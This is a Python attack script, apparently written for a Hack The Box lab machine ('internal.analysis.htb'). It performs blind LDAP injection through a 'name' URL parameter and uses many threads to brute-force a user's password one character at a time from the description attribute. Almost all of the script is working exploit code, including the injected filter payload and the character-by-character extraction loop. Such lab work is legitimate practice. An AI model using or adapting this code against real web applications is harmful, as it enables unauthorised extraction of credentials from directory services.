import argparse
import requests
import urllib.parse
import threading
from queue import Queue

def worker(base_url, found_chars, q, results, skip_count, add_star, stop_event):
    while not q.empty() and not stop_event.is_set():
        char = q.get()

        if '*' in char and skip_count[0] > 0:
            skip_count[0] -= 1
            q.task_done()
            continue

        if '*' in char and add_star[0]:
            add_star[0] = False
            results.put(char)
            q.task_done()
            continue

        char_encoded = urllib.parse.quote(char)
        modified_url = base_url.replace("{FUZZ}", char_encoded).replace("{found_char}", found_chars)

        try:
            response = requests.get(modified_url, timeout=5)
            if "technician" in response.text and response.status_code == 200:
                results.put(char)
                break
        except requests.RequestException as e:
            print(f"Request failed for character '{char}': {e}")
        q.task_done()

def main(charset_path, thread_count):
    base_url = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
    found_chars = ""
    repeat_count = 0
    last_char = ""
    max_repeats = 10
    skip_count = [6]
    add_star = [True]
    stop_event = threading.Event()

    with open(charset_path, "r") as file:
        charset = file.read().splitlines()

    try:
        while True:
            q = Queue()
            results = Queue()
            for char in charset:
                q.put(char)

            threads = []
            for _ in range(thread_count):
                thread = threading.Thread(target=worker, args=(base_url, found_chars, q, results, skip_count, add_star, stop_event))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

            if not results.empty():
                found_char = results.get()
                if found_char == last_char:
                    repeat_count += 1
                    if repeat_count >= max_repeats:
                        # print(f"\nHAPPY HACKING (; ")
                        break
                else:
                    repeat_count = 0

                last_char = found_char
                found_chars += found_char
                print(f"\rEXTRACTING PASSWORD --> {found_chars}", end="")
                continue

            if results.empty():
                break

        print(f"\nFINAL PASSWORD      --> {found_chars}")

    except KeyboardInterrupt:
        stop_event.set()
        for thread in threads:
            thread.join()
        print(f"last result before you fuck with CTRL + C --> {found_chars}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LDAP injection fuzzer script for password extraction")
    parser.add_argument("-c", "--charset", required=True, help="wordlist")
    parser.add_argument("-t", "--threads", type=int, default=20, help="threads")
    args = parser.parse_args()

    main(args.charset, args.threads)
